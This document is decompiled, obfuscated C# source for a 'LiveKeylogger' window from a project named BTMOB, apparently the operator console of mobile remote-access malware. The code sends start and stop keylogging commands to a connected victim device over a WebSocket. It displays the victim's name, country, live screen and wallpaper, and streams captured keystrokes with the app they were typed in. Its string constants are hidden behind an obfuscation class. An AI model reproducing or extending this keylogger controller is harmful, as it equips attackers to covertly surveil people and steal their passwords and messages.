using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using BTMOB.My.Resources;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Web.WebView2.Core;
using Microsoft.Web.WebView2.WinForms;

namespace BTMOB;

[DesignerGenerated]
public class LiveKeylogger : basestyle
{
	[ComVisible(true)]
	public class logbridge
	{
		public LiveKeylogger mainform;

		public logbridge(LiveKeylogger minme)
		{
			mainform = minme;
		}

		[DispId(1)]
		public object stoplogs()
		{
			Thread thread = new Thread([SpecialName] () =>
			{
				mainform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					mainform.stopkeloger();
				}));
			});
			thread.IsBackground = true;
			thread.Start();
			return "null";
		}

		[DispId(2)]
		public object startlogs()
		{
			Thread thread = new Thread([SpecialName] () =>
			{
				mainform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					mainform.StartKloger();
				}));
			});
			thread.IsBackground = true;
			thread.Start();
			return "null";
		}
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("statetimer")]
	private System.Windows.Forms.Timer _statetimer;

	public BTClient Btcli;

	public bool isActivenow;

	public bool ViewReady;

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual System.Windows.Forms.Timer statetimer
	{
		[CompilerGenerated]
		get
		{
			return _statetimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = statetimer_Tick;
			System.Windows.Forms.Timer timer = _statetimer;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_statetimer = value;
			timer = _statetimer;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("logview")]
	internal virtual WebView2 logview
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.LiveKeylogger));
		this.Panel3 = new System.Windows.Forms.Panel();
		this.logview = new Microsoft.Web.WebView2.WinForms.WebView2();
		this.statetimer = new System.Windows.Forms.Timer(this.components);
		((System.ComponentModel.ISupportInitialize)this.myscr).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		this.tobpanelsti.SuspendLayout();
		this.Panel3.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.logview).BeginInit();
		base.SuspendLayout();
		this.pinbtn.Location = new System.Drawing.Point(645, 5);
		this.minibtn.Location = new System.Drawing.Point(687, 5);
		this.closbtn.Location = new System.Drawing.Point(729, 5);
		this.mytitle.Location = new System.Drawing.Point(5, 4);
		this.mytitle.Size = new System.Drawing.Size(761, 18);
		this.tobpanelsti.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.tobpanelsti.Size = new System.Drawing.Size(771, 26);
		this.Panel3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel3.Controls.Add(this.logview);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel3.Location = new System.Drawing.Point(2, 64);
		this.Panel3.Name = EXGuarder._064E6F45;
		this.Panel3.Padding = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.Panel3.Size = new System.Drawing.Size(771, 689);
		this.Panel3.TabIndex = 41;
		this.logview.AllowExternalDrop = true;
		this.logview.CreationProperties = null;
		this.logview.DefaultBackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.logview.Dock = System.Windows.Forms.DockStyle.Fill;
		this.logview.Location = new System.Drawing.Point(4, 4);
		this.logview.Name = EXGuarder._46416E5D;
		this.logview.Size = new System.Drawing.Size(763, 681);
		this.logview.TabIndex = 0;
		this.logview.ZoomFactor = 1.0;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 18f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(775, 755);
		base.Controls.Add(this.Panel3);
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._0F1B6817);
		base.Name = EXGuarder._170B051A;
		this.Text = EXGuarder._681B5926;
		base.Controls.SetChildIndex(this.tobpanelsti, 0);
		base.Controls.SetChildIndex(this.Panel3, 0);
		((System.ComponentModel.ISupportInitialize)this.myscr).EndInit();
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		this.tobpanelsti.ResumeLayout(false);
		this.Panel3.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.logview).EndInit();
		base.ResumeLayout(false);
	}

	public LiveKeylogger()
	{
		base.Load += LiveKeylogger_Load;
		base.FormClosing += LiveKeylogger_FormClosing;
		isActivenow = true;
		ViewReady = false;
		InitializeComponent();
	}

	private async void LiveKeylogger_Load(object sender, EventArgs e)
	{
		await logview.EnsureCoreWebView2Async();
		logbridge rawObject = new logbridge(this);
		logview.CoreWebView2.NavigationCompleted += lg_NavigationCompleted;
		logview.NavigateToString(Resources.livelogs);
		logview.CoreWebView2.AddHostObjectToScript("recHost", rawObject);
		logview.CoreWebView2.Settings.AreDefaultContextMenusEnabled = false;
		logview.CoreWebView2.Settings.AreDevToolsEnabled = false;
		myico.Image = Btcli.wallpaper;
		myscr.Image = Btcli.screen;
		mytitle.Text = BTConst.Keyloggerstr + " | " + Btcli.name + " | " + Btcli.country;
		statetimer.Start();
	}

	private void lg_NavigationCompleted(object sender, CoreWebView2NavigationCompletedEventArgs e)
	{
		if (e.IsSuccess)
		{
			ViewReady = true;
		}
	}

	private void statetimer_Tick(object sender, EventArgs e)
	{
		try
		{
			if (Btcli.isConnected)
			{
				myscr.Image = Btcli.screen;
				myico.Image = Btcli.wallpaper;
				mytitle.Text = BTConst.Keyloggerstr + EXGuarder._2F605437 + Btcli.name + EXGuarder._2F605437 + Btcli.country;
			}
			else
			{
				myico.Image = Resources.no_con;
				myscr.Image = null;
				mytitle.Text = BTConst.Keyloggerstr + EXGuarder._2F605437 + BTConst.Disconnectedstr;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void LiveKeylogger_FormClosing(object sender, FormClosingEventArgs e)
	{
		stoper();
		statetimer.Stop();
	}

	private void stopkeloger()
	{
		if (isActivenow)
		{
			stoper();
		}
	}

	private void stoper()
	{
		VB_0024AnonymousType_9<string, string> data = new VB_0024AnonymousType_9<string, string>(EXGuarder._0C505028, EXGuarder._100B771A);
		string value = BTCommand.FormatCommand(EXGuarder._75034A3E, data);
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._6729782E, BTConst.wrk);
		dictionary.Add(EXGuarder._0A2A0A29, value);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
		isActivenow = false;
	}

	private void StartKloger()
	{
		if (!isActivenow)
		{
			VB_0024AnonymousType_9<string, string> data = new VB_0024AnonymousType_9<string, string>(EXGuarder._79266555, EXGuarder._6029165D);
			string value = BTCommand.FormatCommand(EXGuarder._452F2D1B, data);
			Dictionary<string, object> dictionary = new Dictionary<string, object>();
			dictionary.Add(EXGuarder._6C0D5E56, BTConst.wrk);
			dictionary.Add(EXGuarder._0C5D3546, value);
			Dictionary<string, object> chatData = dictionary;
			BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
			isActivenow = true;
		}
	}

	public void printlog(string typeevent, string appname, string keytext)
	{
		try
		{
			if (!ViewReady)
			{
				return;
			}
			if (base.InvokeRequired)
			{
				Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					printlog(typeevent, appname, keytext);
				}));
			}
			else
			{
				string javaScript = string.Format(EXGuarder._431C0D2D, typeevent, appname, keytext);
				logview.CoreWebView2.ExecuteScriptAsync(javaScript);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}
}
